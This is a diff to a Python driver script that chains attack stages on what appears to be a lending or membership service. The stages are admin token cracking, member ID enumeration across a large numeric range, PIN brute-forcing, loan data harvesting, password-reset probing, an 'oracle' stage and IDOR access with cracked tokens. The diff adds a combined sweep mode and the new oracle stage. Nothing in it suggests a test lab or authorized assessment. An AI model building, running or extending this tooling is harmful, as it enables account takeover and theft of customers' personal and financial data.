@@ -69,6 +69,7 @@ def save(name, obj):
         json.dump(obj, f, ensure_ascii=False, indent=1)
 
 
+FULLISH = ("full", "sweep")
 CURSOR_FILE = "state_hunt_cursor.json"
 SCAN_FLOOR = 40000000
 SCAN_CEIL = 99000000
@@ -109,20 +110,22 @@ def main():
 
     if ok and phase in ("admin",) and not os.path.exists(os.path.join(ROOT, "admin_token.json")):
         sh(["python3", "admin_cracker.py"])
-    if ok and phase in ("enum", "full"):
+    if ok and (phase in FULLISH or phase == "enum"):
         sl = enum_slice(size)
         if sl:
             sh(["python3", "hunt_members.py", str(sl[0]), str(sl[1]), "4"])
         manifest["enum"] = sl
-    if ok and phase in ("pin", "full"):
+    if ok and (phase in FULLISH or phase == "pin"):
         sh(["python3", "pin_attacker.py"])
-    if ok and phase in ("harvest", "full"):
+    if ok and (phase in FULLISH or phase == "harvest"):
         sh(["python3", "harvest_loans.py"])
-    if ok and phase in ("reset",):
+    if ok and phase == "reset":
         sh(["python3", "reset_probe.py"])
-    if ok and phase in ("same_day", "full"):
+    if ok and (phase in FULLISH or phase == "oracle"):
+        sh(["python3", "admin_oracle.py"])
+    if ok and (phase in FULLISH or phase == "same_day"):
         sh(["python3", "admin_same_day.py"])
-    if ok and phase in ("idor", "full"):
+    if ok and (phase in FULLISH or phase == "idor"):
         if os.path.exists(os.path.join(ROOT, "cracked_tokens.json")):
             toks = load("cracked_tokens.json", [])
             if toks:
